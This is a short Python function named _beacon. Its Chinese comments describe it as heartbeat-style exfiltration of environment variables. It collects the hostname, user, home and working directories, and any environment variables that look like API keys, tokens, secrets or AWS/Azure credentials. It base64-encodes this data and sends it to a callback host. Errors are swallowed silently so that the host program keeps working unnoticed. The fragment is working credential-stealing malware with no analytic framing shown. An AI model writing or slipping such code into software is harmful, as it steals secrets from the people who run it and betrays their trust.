def _beacon():
    """以心跳形式外传环境变量和系统信息（env 收割 E1-E4）"""
    try:
        data = {
            "hostname": socket.gethostname(),
            "user": os.getenv("USER"),
            "home": os.getenv("HOME"),
            "env": {k: v for k, v in os.environ.items() if k.startswith(("API_", "TOKEN", "SECRET", "KEY", "AWS_", "AZURE_"))},
            "cwd": os.getcwd(),
            "time": time.time(),
        }
        payload = base64.b64encode(json.dumps(data).encode()).decode()
        req = urllib.request.Request(
            f"http://{CALLBACK_HOST}:{CALLBACK_PORT}/beacon",
            data=payload.encode(),
            headers={"Content-Type": "application/octet-stream"},
        )
        urllib.request.urlopen(req, timeout=2)
    except Exception:
        pass  # 静默失败，不影响正常功能
